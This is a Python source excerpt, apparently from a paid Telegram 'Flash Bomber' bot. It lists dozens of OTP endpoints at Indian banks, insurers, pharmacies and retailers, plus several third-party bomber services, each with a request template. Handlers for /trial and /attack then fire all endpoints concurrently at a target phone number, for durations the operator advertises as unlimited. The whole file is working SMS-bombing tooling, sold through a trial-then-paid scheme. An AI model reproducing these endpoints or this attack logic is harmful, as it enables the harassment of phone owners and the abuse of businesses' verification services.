        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Cult.fit",
        "url": "https://www.cult.fit/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "HealthifyMe",
        "url": "https://www.healthifyme.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Pristyn Care",
        "url": "https://www.pristyncare.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "PharmEasy",
        "url": "https://pharmeasy.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Tata 1mg",
        "url": "https://www.1mg.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Apollo 24/7",
        "url": "https://www.apollo247.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "MFine",
        "url": "https://www.mfine.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "DocsApp",
        "url": "https://www.docsapp.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Lybrate",
        "url": "https://www.lybrate.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Portea Medical",
        "url": "https://www.portea.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "PolicyBazaar",
        "url": "https://www.policybazaar.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "CoverFox",
        "url": "https://www.coverfox.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Acko",
        "url": "https://www.acko.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Digit Insurance",
        "url": "https://www.godigit.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "HDFC Ergo",
        "url": "https://www.hdfcergo.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "ICICI Lombard",
        "url": "https://www.icicilombard.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Bajaj Allianz",
        "url": "https://www.bajajallianz.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Star Health",
        "url": "https://www.starhealth.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Max Bupa",
        "url": "https://www.maxbupa.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Kotak Life",
        "url": "https://www.kotaklife.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "SBI Life",
        "url": "https://www.sbilife.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "LIC India",
        "url": "https://www.licindia.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "HDFC Life",
        "url": "https://www.hdfclife.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Axis Bank",
        "url": "https://www.axisbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "ICICI Bank",
        "url": "https://www.icicibank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "HDFC Bank",
        "url": "https://www.hdfcbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "SBI Bank",
        "url": "https://www.sbi.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Kotak Bank",
        "url": "https://www.kotak.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Yes Bank",
        "url": "https://www.yesbank.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "IndusInd Bank",
        "url": "https://www.indusind.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "IDFC Bank",
        "url": "https://www.idfcfirstbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "AU Bank",
        "url": "https://www.aubank.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "RBL Bank",
        "url": "https://www.rblbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Bandhan Bank",
        "url": "https://www.bandhanbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Federal Bank",
        "url": "https://www.federalbank.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Canara Bank",
        "url": "https://www.canarabank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "PNB",
        "url": "https://www.pnbindia.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Bank of Baroda",
        "url": "https://www.bankofbaroda.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Union Bank",
        "url": "https://www.unionbankofindia.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Indian Bank",
        "url": "https://www.indianbank.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Central Bank",
        "url": "https://www.centralbankofindia.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Bank of India",
        "url": "https://www.bankofindia.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "IDBI Bank",
        "url": "https://www.idbibank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "UCO Bank",
        "url": "https://www.ucobank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Indian Overseas Bank",
        "url": "https://www.iob.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Punjab & Sind Bank",
        "url": "https://www.psbindia.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    # ============ APIs FROM new.api.txt (Simple URL APIs) ============
    {
        "name": "SMS Bomber API 1",
        "url": "http://sms-bomber.subhxcosmo.workers.dev/api?num={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 10
    },
    {
        "name": "Bomber Main 2 API",
        "url": "https://bomber-main-2.vercel.app/?key=roots&number={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 10
    },
    {
        "name": "Bomber Main 3 API",
        "url": "https://bomber-main-3.vercel.app/bomb?number={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 10
    },
    {
        "name": "Supabase Fast Hit API",
        "url": "https://goknhwdapjjcqmcoclxi.supabase.co/functions/v1/fast-hit?phone={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 10
    },
    # ============ Additional APIs from api.txt (OYO, Delhivery, etc.) ============
    {
        "name": "OYO Rooms API",
        "url": "https://www.oyorooms.com/api/pwa/generateotp",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 10
    },
    {
        "name": "Delhivery Direct",
        "url": "https://direct.delhivery.com/delhiverydirect/order/generate-otp",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 10
    },
    {
        "name": "ConfirmTkt API",
        "url": "https://securedapi.confirmtkt.com/api/platform/register",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 10
    },
    {
        "name": "Hero MotoCorp API",
        "url": "https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_no={phone}&randome=ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=&mobile_no_otp=&csrf=523bc3fa1857c4df95e4d24bbd36c61b",
        "count": 10
    },
    {
        "name": "IndiaLends API",
        "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"aeyder03teaeare=1&ertysvfj74sje=91&jfsdfu14hkgertd={phone}&lj80gertdfg=0",
        "count": 10
    },
    {
        "name": "Flipkart Signup Status",
        "url": "https://www.flipkart.com/api/6/user/signup/status",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"loginId": [f"+91{phone}"], "supportAllStates": True}),
        "count": 10
    },
    {
        "name": "Flipkart Generate OTP",
        "url": "https://www.flipkart.com/api/5/user/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"loginId=+91{phone}&state=VERIFIED&churnEmailRequest=false",
        "count": 10
    },
    {
        "name": "Practo API",
        "url": "https://accounts.practo.com/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"client_name=Practo Android App&mobile=+91{phone}&fingerprint=&device_name=samsung+SM-G9350",
        "count": 10
    },
    {
        "name": "PizzaHut API",
        "url": "https://m.pizzahut.co.in/api/cart/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"customer": {"MobileNo": phone, "UserName": phone, "merchantId": "98d18d82-ba59-4957-9c92-3f89207a34f6"}}),
        "count": 10
    },
    {
        "name": "Goibibo API",
        "url": "https://www.goibibo.com/common/downloadsms/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mbl={phone}",
        "count": 10
    },
    {
        "name": "Apollo Pharmacy API",
        "url": "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile={phone}",
        "count": 10
    },
    {
        "name": "Ajio API",
        "url": "https://www.ajio.com/api/auth/signupSendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"firstName": "SpeedX", "login": "johnyaho@gmail.com", "password": "Rock@5star", "genderType": "Male", "mobileNumber": phone, "requestType": "SENDOTP"}),
        "count": 10
    },
    {
        "name": "AltBalaji API",
        "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"country_code": "91", "phone_number": phone}),
        "count": 10
    },
    {
        "name": "Grab API",
        "url": "https://api.grab.com/grabid/v1/phone/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"method": "SMS", "countryCode": "id", "phoneNumber": f"91{phone}", "templateID": "pax_android_production"}),
        "count": 10
    },
    {
        "name": "GheeAPI (Gokwik)",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"phone": phone, "country": "IN"}),
        "count": 10
    },
    {
        "name": "EdzAPI (Gokwik)",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"phone": phone, "country": "IN"}),
        "count": 10
    },
    {
        "name": "NeclesAPI (Gokwik)",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"phone": phone, "country": "IN"}),
        "count": 10
    },
    {
        "name": "VidyaKul API",
        "url": "https://vidyakul.com/signup-otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&rcsconsent=true",
        "count": 10
    },
    {
        "name": "Aditya Birla Capital API",
        "url": "https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"request": phone}),
        "count": 10
    },
    {
        "name": "Pinknblu API",
        "url": "https://pinknblu.com/v1/auth/generate/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"_token=fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb&country_code=%2B91&phone={phone}",
        "count": 10
    },
    {
        "name": "Udaan API",
        "url": "https://auth.udaan.com/api/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile={phone}",
        "count": 10
    },
    {
        "name": "Nuvama Wealth API",
        "url": "https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"contactInfo": phone, "mode": "SMS"}),
        "count": 10
    },
    {
        "name": "Flipkart 2.0 API",
        "url": "https://2.rome.api.flipkart.com/1/action/view",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"actionRequestContext": {"type": "LOGIN_IDENTITY_VERIFY", "loginIdPrefix": "+91", "loginId": phone, "clientQueryParamMap": {"ret": "/"}, "loginType": "MOBILE", "verificationType": "OTP", "screenName": "LOGIN_V4_MOBILE", "sourceContext": "DEFAULT"}}),
        "count": 10
    },
    {
        "name": "Physics Wallah (PW) API",
        "url": "https://api.penpencil.co/v1/users/get-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"username": phone, "countryCode": "+91", "organizationId": "5eb393ee95fab7468a79d189"}),
        "count": 10
    },
    {
        "name": "Rozgar (Rojgar With Ankit) API",
        "url": "https://rozgarapinew.teachx.in/get/sendotp",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 10
    }
]
# =============== ALL APIs END ===============

TOTAL_APIS = len(APIS)

ADMIN_USER_IDS = [7459756974]

def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id in ADMIN_USER_IDS

# =============== BOT FUNCTIONS ===============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a message when the command /start is issued."""
    user_id = update.effective_user.id
    
    # Get user's first name (clean it)
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    username = update.effective_user.username or "Not set"
    
    # Get trial info
    trial_info = await get_user_trial_info(user_id)
    
    # If user doesn't exist in database, add them
    if not trial_info['exists']:
        await add_authorized_user(user_id, username, clean_first_name, 0, False)
        trial_info = await get_user_trial_info(user_id)
    
    # Check if user can use trial
    trial_allowed, reason = await can_user_use_trial(user_id)
    
    welcome_text = f"""
╔════════════════════════════════════════════════╗
║        ⚡💥 FLASH BOMBER BOT 💥⚡        ║
║           ULTIMATE SMS BOMBER           ║
╚════════════════════════════════════════════════╝

👤 USER INFO:
├─ Name: {clean_first_name}
├─ ID: {user_id}
├─ Username: @{username}

🎁 TRIAL STATUS:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Last Trial: {trial_info['last_trial_used'].split('T')[0] if trial_info['last_trial_used'] else 'Never'}
├─ Trial Blocked: {"✅ YES" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Paid User: {"✅ Yes" if trial_info['is_paid_user'] else "❌ No"}
├─ Trial Available: {"✅ Yes" if trial_allowed else "❌ No"}
└─ Status: {reason}

⚡ FLASH ATTACK FEATURES:
├─ Speed: Level 5 (FLASH MODE)
├─ Strategy: All APIs fire simultaneously
├─ Concurrency: 1000 parallel requests
├─ Total APIs: {TOTAL_APIS}
└─ Max OTPs/sec: {TOTAL_APIS * 10 if TOTAL_APIS > 0 else 0}

📋 COMMANDS:
├─ /trial <number> - One-time free trial (60s)
├─ /mytrial - Check your trial status
├─ /attack <number> <time> - Paid flash attack
├─ /speed <1-5> - Set speed (Paid users only)
├─ /stop - Stop current attack
├─ /stats - View statistics
└─ /help - Show help

⚠️ IMPORTANT TRIAL RULES:
├─ ✅ Trial available: ONE TIME ONLY
├─ ❌ After trial: PERMANENTLY BLOCKED
├─ 🔒 No further trial access after use
├─ 💰 Contact admin for paid access only
└─ 👑 Admin: @VIP_X_OFFICIAL

💰 FOR FULL ACCESS:
Contact: @VIP_X_OFFICIAL

📡 STATUS: ✅ ONLINE | ⚡ READY FOR FLASH ATTACK
"""
    
    await update.message.reply_text(welcome_text)

async def mytrial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check user's trial status"""
    user_id = update.effective_user.id
    
    # Get user's clean name
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    username = update.effective_user.username or "Not set"
    
    trial_info = await get_user_trial_info(user_id)
    
    # If user doesn't exist, add them
    if not trial_info['exists']:
        await add_authorized_user(user_id, username, clean_first_name, 0, False)
        trial_info = await get_user_trial_info(user_id)
    
    # Check trial availability
    trial_allowed, reason = await can_user_use_trial(user_id)
    
    status_emoji = "✅" if trial_allowed else "❌"
    status_text = "AVAILABLE" if trial_allowed else "NOT AVAILABLE"
    
    trial_status_text = f"""
╔════════════════════════════════════════╗
║          🎁 YOUR TRIAL STATUS         ║
╚════════════════════════════════════════╝

👤 USER INFORMATION:
├─ ID: {user_id}
├─ Name: {clean_first_name}
├─ Username: @{username}

📊 TRIAL STATISTICS:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Last Trial Used: {trial_info['last_trial_used'].split('T')[0] if trial_info['last_trial_used'] else 'Never'}
├─ Trial Blocked: {"✅ PERMANENTLY" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Paid User: {"✅ Yes" if trial_info['is_paid_user'] else "❌ No"}

🎯 CURRENT STATUS:
├─ Trial Status: {status_emoji} {status_text}
├─ Reason: {reason}
└─ Duration: 60 seconds (One-time only)

⚡ FLASH ATTACK INFO:
├─ Total APIs: {TOTAL_APIS}
├─ Max OTPs/sec: {TOTAL_APIS * 10 if TOTAL_APIS > 0 else 0}
└─ Mode: FLASH ATTACK (Level 5)

⚠️ IMPORTANT NOTES:
"""
    
    if trial_allowed:
        trial_status_text += """
├─ ✅ You can use /trial <number> NOW
├─ ⏰ Trial lasts 60 seconds only
├─ 🔒 After trial, access will be PERMANENTLY BLOCKED
├─ ⚠️ This is ONE-TIME USE ONLY
└─ 💰 Contact admin for paid access
"""
    else:
        trial_status_text += """
├─ ❌ Trial NOT available
├─ 🔒 Trial access is PERMANENTLY BLOCKED
├─ ⚠️ One-time trial already used
├─ 💰 Contact admin for paid access
└─ 👑 Admin: @VIP_X_OFFICIAL
"""
    
    await update.message.reply_text(trial_status_text)

async def trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle free trial command - ONE TIME USE ONLY"""
    user_id = update.effective_user.id
    
    # Get user's clean name
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    username = update.effective_user.username or "Not set"
    
    # STRICT CHECK: First check database
    trial_info = await get_user_trial_info(user_id)
    
    # If user doesn't exist, add them
    if not trial_info['exists']:
        await add_authorized_user(user_id, username, clean_first_name, 0, False)
        trial_info = await get_user_trial_info(user_id)
    
    # Check if user can use trial - STRICT CHECK
    trial_allowed, reason = await can_user_use_trial(user_id)
    
    if not trial_allowed:
        await update.message.reply_text(
            f"""
╔═══════════════════════╗
║     ❌ TRIAL DENIED     ║
╚═══════════════════════╝

Reason: {reason}

📊 YOUR TRIAL INFO:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Trial Blocked: {"✅ Yes" if trial_info['is_trial_blocked'] else "❌ No"}
├─ Paid User: {"✅ Yes" if trial_info['is_paid_user'] else "❌ No"}

⚠️ IMPORTANT:
├─ Trial is ONE-TIME USE ONLY
├─ After use, it's PERMANENTLY BLOCKED
├─ No further trial access available
├─ Only paid access now

💰 Contact Admin for Full Access:
👑 @VIP_X_OFFICIAL
"""
        )
        return
    
    # Validate arguments
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            """
╔════════════════════════════════════════╗
║        🎁 FREE FLASH TRIAL         ║
╚════════════════════════════════════════╝

Usage: /trial <phone_number>

⚡ FLASH ATTACK FEATURES:
├─ Duration: 60 seconds (1 minute)
├─ Speed: FLASH MODE (Level 5)
├─ Strategy: All APIs fire at once
├─ Limit: ONE TIME ONLY
└─ After trial: PERMANENTLY BLOCKED

Example: /trial 9876543210

⚠️ IMPORTANT RULES:
├─ ✅ Available: ONE TIME ONLY
├─ ❌ After use: PERMANENTLY BLOCKED
├─ 🔒 No further trial access
├─ 💰 Contact admin for paid access
└─ 👑 Admin: @VIP_X_OFFICIAL
"""
        )
        return
    
    phone = context.args[0]
    
    # Validate phone number
    if not re.match(r'^\d{10}$', phone):
        await update.message.reply_text(
            "❌ Invalid phone number!\n"
            "Must be exactly 10 digits (Indian number)."
        )
        return
    
    # Check if APIs are configured
    if TOTAL_APIS == 0:
        await update.message.reply_text(
            """
╔═══════════════════════╗
║  ⚡ NO APIs CONFIGURED  ║
╚═══════════════════════╝

APIs are not configured yet.

Contact admin for support: @VIP_X_OFFICIAL
"""
        )
        return
    
    # IMMEDIATELY mark trial as used and BLOCK it
    await mark_trial_used(user_id)
    
    # Set speed to level 5 for flash attack
    flash_settings = {
        'speed_level': 5,
        'max_concurrent': SPEED_PRESETS[5]['max_concurrent'],
        'delay': SPEED_PRESETS[5]['delay']
    }
    await set_user_speed_settings(user_id, flash_settings)
    
    # Set flash attack parameters
    duration = 60  # 1 minute for trial
    current_time = datetime.now()
    end_time = current_time + timedelta(seconds=duration)
    
    # Initialize flash attack session
    context.user_data['attacking'] = True
    context.user_data['target_phone'] = phone
    context.user_data['attack_duration'] = duration
    context.user_data['attack_start'] = current_time
    context.user_data['attack_end'] = end_time
    context.user_data['total_requests'] = 0
    context.user_data['successful_requests'] = 0
    context.user_data['failed_requests'] = 0
    context.user_data['speed_settings'] = flash_settings
    context.user_data['is_trial_attack'] = True
    
    # Get updated trial info
    updated_trial_info = await get_user_trial_info(user_id)
    
    # Create initial flash attack message
    status_message = f"""
╔════════════════════════════════════════╗
║      ⚡💥 FLASH ATTACK STARTED     ║
╚════════════════════════════════════════╝

🎯 TARGET: {phone}
⏱️ DURATION: {duration} seconds (1 minute)
⚡ MODE: FLASH ATTACK (TRIAL)
📅 STARTED: {current_time.strftime('%H:%M:%S')}

⚡ FLASH CONFIGURATION:
├─ Speed: FLASH MODE (Level 5)
├─ Strategy: All APIs fire simultaneously
├─ Concurrency: 1000 parallel requests
├─ Total APIs: {TOTAL_APIS}
└─ Max OTPs/sec: {TOTAL_APIS * 10}

🎁 TRIAL INFORMATION:
├─ Trial Count: {updated_trial_info['trial_used_count']}
├─ Trial Status: ONE-TIME USE
├─ After This: PERMANENTLY BLOCKED
└─ Next Step: Contact admin for paid access

📡 ATTACK STATUS:
├─ Status: FIRING ALL APIs
├─ Mode: Maximum Destruction
└─ Will stop: After 60 seconds

⚠️ IMPORTANT:
This is your ONE-TIME FREE FLASH ATTACK!
After this, trial access will be PERMANENTLY BLOCKED.

📊 INITIAL STATS:
├─ Requests: 0
├─ Success: 0
├─ Failed: 0
└─ RPS: 0.0
"""
    
    start_msg = await update.message.reply_text(status_message)
    
    context.user_data['status_message_id'] = start_msg.message_id
    context.user_data['status_chat_id'] = update.effective_chat.id
    context.user_data['last_rps_update'] = time.time()
    context.user_data['requests_since_last_update'] = 0
    context.user_data['last_status_update'] = time.time()
    
    # Start FLASH ATTACK
    asyncio.create_task(run_flash_attack(update, context, phone, duration, flash_settings, is_trial=True))

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /attack command for FLASH ATTACK - Paid users only"""
    user_id = update.effective_user.id
    
    # Get user's clean name
    user_first_name = update.effective_user.first_name or "User"
    clean_first_name = clean_text(user_first_name)
    
    # First check if user is paid user
    if not await is_user_authorized(user_id):
        trial_info = await get_user_trial_info(user_id)
        
        # Check if trial is available
        trial_allowed, reason = await can_user_use_trial(user_id)
        
        if trial_allowed:
            await update.message.reply_text(
                f"""
╔═══════════════════════╗
║   🎁 USE TRIAL FIRST   ║
╚═══════════════════════╝

You have a ONE-TIME FREE TRIAL available!

Use your free trial first:
/trial <number>

⚠️ IMPORTANT:
├─ Trial: 60 seconds, ONE TIME ONLY
├─ After trial: PERMANENTLY BLOCKED
├─ Then contact admin for paid access
└─ Admin: @VIP_X_OFFICIAL
"""
            )
        else:
            await update.message.reply_text(
                f"""
╔═══════════════════════╗
║    🔒 ACCESS DENIED    ║
╚═══════════════════════╝

You have used your ONE-TIME trial.

📊 YOUR STATUS:
├─ Trials Used: {trial_info['trial_used_count']}
├─ Last Trial: {trial_info['last_trial_used'].split('T')[0] if trial_info['last_trial_used'] else 'Never'}
├─ Trial Blocked: ✅ PERMANENTLY
├─ Paid User: ❌ No

💰 Contact Admin for Full Access:
👑 @VIP_X_OFFICIAL
⚠️ Trial access is PERMANENTLY BLOCKED.
Only paid access available now.
"""
            )
        return
    
    # Check if already attacking
    if context.user_data.get('attacking', False):
        await update.message.reply_text(
            """
╔═══════════════════════╗
║  ⚡ ALREADY ATTACKING  ║
╚═══════════════════════╝

You already have an active attack.
Use /stop to stop it first.
"""
        )
        return
    
    # Validate arguments
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            """
╔════════════════════════════════════════╗
║        ⚡💥 FLASH ATTACK COMMAND    ║
╚════════════════════════════════════════╝

Usage: /attack <number> <duration>

⚡ FLASH ATTACK MODE:
├─ Speed: Maximum (Level 5)
├─ Strategy: All APIs fire at once
├─ Concurrency: 1000 parallel requests
└─ OTPs: Unlimited during attack

Examples:
├─ /attack 9876543210 30 - 30 seconds
├─ /attack 9876543210 120 - 2 minutes
└─ /attack 9876543210 1000000000000000- Unlimited

Limits:
├─ Minimum: 10 seconds
└─ Maximum: No limit 
"""
        )
        return
    
    phone = context.args[0]
    duration_str = context.args[1]
    
    # Validate phone number
    if not re.match(r'^\d{10}$', phone):
        await update.message.reply_text(
            "❌ Invalid phone number!\n"
            "Must be exactly 10 digits (Indian number)."
        )
        return
    
    # Validate duration
    try:
        duration = int(duration_str)
        if duration < 10:
            await update.message.reply_text("❌ Duration must be at least 10 seconds.")
